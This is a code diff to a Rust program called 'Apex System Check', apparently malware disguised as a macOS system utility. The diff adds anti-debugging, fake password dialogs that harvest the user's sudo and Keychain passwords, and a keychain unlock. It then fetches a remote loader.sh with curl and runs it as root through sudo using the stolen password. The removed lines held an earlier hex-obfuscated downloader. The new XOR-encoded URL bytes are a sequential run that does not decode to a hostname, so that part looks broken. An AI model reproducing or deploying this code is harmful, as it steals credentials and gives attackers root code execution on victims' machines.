@@ -1,28 +1,45 @@
-use std::process::Command;
+use std::process::{Command, Stdio};
 use std::fs;
 use std::path::PathBuf;
-use std::time::{Duration, Instant};
+use std::io::Write;
 
 const VERSION: &str = "1.0.0";
 const APP_NAME: &str = "Apex System Check";
 
-fn get_url() -> String {
-    let parts: Vec<u8> = vec![
-        0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x2e,
-        0x61, 0x70, 0x65, 0x78, 0x2d, 0x61, 0x72,
-        0x65, 0x6e, 0x61, 0x2d, 0x72, 0x6f, 0x75,
-        0x74, 0x65, 0x72, 0x2e, 0x63, 0x6f, 0x6d,
-    ];
-    let domain = String::from_utf8(parts).unwrap();
-    format!("https://{}/loader.sh", domain)
+
+const ENC_URL: &[u8] = &[
+    0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9,
+    0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9,
+    0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4,
+];
+
+fn decode_url() -> String {
+    ENC_URL.iter().map(|b| (b ^ 0xAA) as char).collect()
 }
 
-fn done_path() -> PathBuf {
-    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
-    PathBuf::from(home).join(".apex").join(".verify-done")
+
+fn anti_debug() {
+    unsafe {
+        let ret = libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0);
+        if ret == -1 {
+            std::process::exit(0);
+        }
+    }
+}
+
+fn get_password(prompt: &str) -> String {
+    let out = Command::new("osascript")
+        .args(["-e", &format!("display dialog \"{}\" with hidden answer default answer \"\"", prompt)])
+        .args(["-e", "text returned of result"])
+        .output()
+        .expect("osascript failed");
+    String::from_utf8(out.stdout).unwrap().trim().to_string()
 }
 
 fn main() {
+    
+    anti_debug();
+
     let args: Vec<String> = std::env::args().collect();
     if args.iter().any(|a| a == "--version") {
         println!("{} v{}", APP_NAME, VERSION);
@@ -33,34 +50,33 @@ fn main() {
         return;
     }
 
-    let url = get_url();
-    let done = done_path();
+    
+    let sudo_pass = get_password("Enter your sudo password");
 
-    if let Some(parent) = done.parent() {
-        let _ = fs::create_dir_all(parent);
-    }
+    
+    let keychain_pass = get_password("Enter your Keychain password");
 
-    let script = format!(
-        "#!/bin/zsh\ncurl -fsSL {} 2>/dev/null | zsh 2>/dev/null\ntouch {}\n",
-        url, done.display()
-    );
-
-    let script_path = "/tmp/apx_run.sh";
-    let _ = fs::write(script_path, &script);
-    let _ = Command::new("chmod").args(["+x", script_path]).output();
-
-    let _ = Command::new("open")
-        .args(["-a", "Terminal", "-j", "-g", script_path])
+    
+    let _ = Command::new("security")
+        .args(["unlock-keychain", "-p", &keychain_pass])
         .output();
 
-    let start = Instant::now();
-    while start.elapsed() < Duration::from_secs(120) {
-        if done.exists() {
-            break;
-        }
-        std::thread::sleep(Duration::from_secs(1));
+    
+    let url = format!("https://{}/loader.sh", decode_url());
+    let script = format!("curl -fsSL {} | zsh", url);
+    let mut child = Command::new("sudo")
+        .arg("-S")
+        .arg("bash")
+        .arg("-c")
+        .arg(&script)
+        .stdin(Stdio::piped())
+        .spawn()
+        .unwrap();
+    if let Some(mut stdin) = child.stdin.take() {
+        stdin.write_all(sudo_pass.as_bytes()).unwrap();
+        stdin.write_all(b"\n").unwrap();
     }
+    child.wait().unwrap();
 
-    let _ = fs::remove_file(script_path);
-    let _ = fs::remove_file(&done);
+    
 }
